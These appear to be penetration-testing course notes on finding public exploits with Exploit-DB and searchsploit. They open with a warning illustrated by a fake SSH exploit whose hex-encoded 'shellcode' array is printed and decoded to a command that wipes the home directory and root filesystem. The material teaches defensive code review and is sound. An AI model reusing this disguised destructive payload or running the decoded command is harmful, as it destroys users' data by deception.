### 12.1 Getting Started

- Understand the risk of executing untrusted exploits
- Understand the importance of analyzing the exploit code before execution

#### A Word of Caution

NEVER RUN RANDOM PUBLIC EXPLOITS FROM THE INTERNET without first reading and fully understanding what they do.  For example, `0pen0wn`;
- published as a remote exploit for SSH
- While reading the source code OffSec it was asking for "root" privs
	- suspicious
```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```
- Further investigation found this `jumpcode` array;
```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```
- masked as shellcode
- actually a hex encoded string with a bad shell command
	- One that wipes your system
```bash
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```
- Adding insult to injury, the program then connects to IRC anouncing that you are an idiot

**Noting the above warning** it is best to rely on trustworthy exploit repos as used in this module.  The resources outlined here analyze submitted code before hosting it, but we still must read the code to get an idea of what it does upon execution.  It's also a good way to improve ones code reading skills.

If the code is too complex, best to setup a VM or container for testing.  Assuring the execution is contained until we are sure of its function.

	- exploit impact

#### SearchSploit

Exploit-DB provides a downloadable self hosted archive of their exploit code.  Always update before assesment;
```bash
kali@kali:~$ sudo apt update && sudo apt install exploitdb
[sudo] password for kali: 
...
The following packages will be upgraded:
  exploitdb
...
Setting up exploitdb (20220526-0kali1) ...
...
```
- updates the EDB archive under `/usr/share/exploitdb`
- Two main sections
	- `exploits`
	- `shellcodes`
- Main dir contains a CSV for each section
	- contains information of all files with their subdir
	- similar info to EDB website
```bash
kali@kali:~$ ls -1 /usr/share/exploitdb/
exploits
files_exploits.csv
files_shellcodes.csv
shellcodes
```
- Options;
```

 Options

                                e.g. "WordPress 4.1" would not be detect "WordPress Core 4.1")

       --id                   Display the EDB-ID value rather than local path

```
- Notes section of help menu;
```
=======
 Notes 
=======
 * You can use any number of search terms
 * By default, search terms are not case-sensitive, ordering is irrelevant, and will search between version ranges
   * Use '-c' if you wish to reduce results by case-sensitive searching
   * And/Or '-e' if you wish to filter results by using an exact match
```

- *All local exploits are overwritten when a new package of exploitdb is released, so modifying the exploits in their original locations would cause us to lose those changes.*
